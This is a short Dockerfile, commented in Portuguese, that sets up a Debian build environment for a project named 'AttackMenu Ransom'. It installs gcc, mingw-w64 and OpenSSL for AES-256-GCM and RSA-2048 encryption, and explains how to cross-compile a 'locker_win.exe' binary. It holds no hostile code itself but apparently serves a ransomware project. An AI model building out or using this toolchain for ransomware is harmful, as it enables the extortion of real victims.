# Imagem de compilação do AttackMenu Ransom
# Suporta: Linux (gcc) e Windows (mingw-w64)
FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y \
    # Compilador Linux
    gcc \
    # Cross-compilador Windows
    mingw-w64 \
    # OpenSSL — necessário para AES-256-GCM + RSA-2048-OAEP
    libssl-dev \
    openssl \
    make \
    && rm -rf /var/lib/apt/lists/*

# Nota: cross-compilação Windows + OpenSSL requer libs estáticas mingw.
# Para compilar locker_win.exe com OpenSSL, baixe openssl-mingw no container:
#   apt-get install -y libssl-mingw-w64-dev (se disponível)
# Ou compile OpenSSL para x86_64-w64-mingw32 a partir do source.

WORKDIR /build
CMD ["/bin/bash"]
